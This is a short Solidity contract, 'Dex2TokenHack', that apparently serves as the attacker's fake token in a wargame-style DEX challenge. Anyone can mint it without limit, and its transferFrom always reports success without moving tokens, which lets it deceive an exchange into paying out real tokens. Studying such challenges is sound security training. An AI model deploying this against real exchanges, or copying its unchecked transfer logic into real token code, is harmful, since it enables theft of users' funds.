// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Dex2TokenHack {
    mapping(address => uint256) public balances;

    function mintTo(address to, uint256 amount) external {
        balances[to] += amount;
    }

    function balanceOf(address owner) external view returns (uint256) {
        return balances[owner];
    }

    function transferFrom(address, address, uint256) external returns (bool) {
        return true;
    }
}
